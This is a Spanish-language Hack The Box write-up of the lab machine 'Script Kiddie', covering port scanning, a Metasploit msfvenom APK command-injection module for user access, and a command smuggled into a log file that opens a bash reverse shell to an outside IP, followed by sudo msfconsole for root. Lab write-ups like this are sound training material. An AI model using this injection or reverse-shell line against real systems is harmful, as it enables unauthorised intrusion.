---
description: >-
  G4l1l30 write-up on the easy-difficulty Linux machine Script Kiddie from
  https://hackthebox.eu
title: Hack the Box - Script Kiddie Writeup
date: 2021-06-5 10:40:00 -0600
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, redteam, Linux, msfvenom, nmap, pivoting, msfconsole ]     # TAG names should always be lowercase
show_image_post: true
image: /assets/img/Linux/ScriptKiddie/InfoCard-ScriptKiddie.png
---

# Summary

Script Kiddie es una maquina bastante sencilla, el usuario es pensar un poco fuera de la caja. La parte del root es analizar un script sh, inyectar codigo  para escalar hacia otra cuenta y de ahi con privilegios de sudo obtener una shell de root, esta maquina en si no tiene complejidad.

![masscan_01](/assets/img/Linux/ScriptKiddie/Infocard-scriptkiddie.png)

## Info de la maquina

| VM column  | Detalles      |
| ---------- | ------------- |
| Nombre     | Script Kiddie |
| Dificultad | Easy          |
| Release    | 06/02/2021    |
| OS         | Linux         |
| IP         | 10.10.10.226  |

Editamos ***/etc/hosts***  y agregamos la IP **10.10.10.226** que apunte hacia **scriptkiddie.htb** 

# Escaneo de Puertos

Escaneamos los puertos con Masscan y Nmap, utilizando **Masscan_To_Nmap** , esta herramienta escanea puertos TCP y UDP, toma los abiertos y ejecuta Nmap en búsqueda de servicios y scripts por default, mas info y donde conseguir el script: 

* > [https://github.com/Purp1eW0lf/Masscan_to_Nmap](masscan_to_nmap.py)

Ejecutamos el script : ``sudo python3 masscan_to_nmap.py -i 10.10.10.226`` 

![masscan_01](/assets/img/Linux/ScriptKiddie/masscan_01.png)

Tenemos los siguientes dos puertos : **5000** y **22** , el resultado de Nmap nos arroja lo siguiente:

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
```



# Super H4x0r

Procedemos a verificar el puerto **5000**

![h4x0r](/assets/img/Linux/ScriptKiddie/h4x0r.png)

Un h4x0r WebSite xD, a simple vista tenemos tres(3) herramientas : **nmap** , **msfvenom** y **searchsploit** 

1) Nmap : 

![h4x0r](/assets/img/Linux/ScriptKiddie/h4x0r.png)

No se le puede sacar mas provecho.

2) Searchsploit : 

<img src="/assets/img/Linux/ScriptKiddie/h4x0r_02.png" alt="h4x0r_02" style="zoom:75%;" />

3) Msfvenom y why not, usaremos el mismo searchsploit para buscar algo al respecto: 

![h4x0r_03](/assets/img/Linux/ScriptKiddie/h4x0r_03.png)

Encontramos algo interesante, usaremos ese exploit.

![msf01](/assets/img/Linux/ScriptKiddie/msf01.png)

# User 

``exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection`` 



![msf02](/assets/img/Linux/ScriptKiddie/msf02.png)



Esto nos va a generar un archivo **.apk** 

![msf03](/assets/img/Linux/ScriptKiddie/msf03.png)

![msf04](/assets/img/Linux/ScriptKiddie/msf04.png)



Ponemos netcat a la escucha y : 

![msf05](/assets/img/Linux/ScriptKiddie/msf05.png)

Le hacemos un upgrade a nuestra shell: 

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![kid_user](/assets/img/Linux/ScriptKiddie/kid_user.png)

Ya tenemos el 1er flag :) 



# Root

No hay mucho que hacer, no hay privilegios con sudo, no hay archivos con lo que podamos interactuar, nada interesante en el crontab o en los procesos, asi que hacemos algo de enum basico y nos movemo hacia el otro usuario **pwn** : ``/home/pwn`` veremos un script sh :

![kid_02](/assets/img/Linux/ScriptKiddie/kid_02.png)

Mientras se cumpla la condicion , ejecuta la sentencia de nmap y lo escribe en **hackers** , dado que el script es del usuario **pwn** :

![pwn](/assets/img/Linux/ScriptKiddie/pwn.png)

Intentaremos meter codigo para obtener un rev shell: 

```bash
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.29/4445 0>&1' #" >> hackers
```

![pwn_01](/assets/img/Linux/ScriptKiddie/pwn_01.png)

![pwn_02](/assets/img/Linux/ScriptKiddie/pwn_02.png)

Verificamos los privilegios de sudo :

 

![root_01](/assets/img/Linux/ScriptKiddie/root_01.png)

Procedemos : 

```bash
sudo /opt/metasploit-framework-6.0.9/msfconsole
```

![root_02](/assets/img/Linux/ScriptKiddie/root_02.png)

:) 

![root_03](/assets/img/Linux/ScriptKiddie/root_03.png)

Una maquina bastante sencilla, con esto finalizamos el writeup.

![gali](/assets/img/Linux/ScriptKiddie/gali.png)

